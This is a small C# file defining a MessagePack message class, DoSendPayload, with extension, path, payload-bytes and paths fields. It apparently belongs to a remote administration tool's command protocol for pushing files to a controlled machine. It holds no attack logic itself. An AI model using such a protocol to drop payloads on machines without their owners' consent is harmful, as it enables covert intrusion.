using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using MessagePack;
using Pulsar.Common.Messages.Other;
namespace Pulsar.Common.Messages
{
    [MessagePackObject]
    public class DoSendPayload : IMessage
    {
        [Key(1)]
        public string Extension { get; set; }

        [Key(2)]
        public string Path { get; set; }
        [Key(3)]
        public byte[] Payload { get; set; }

        [Key(4)]
        public string Paths { get; set; }
    }
}
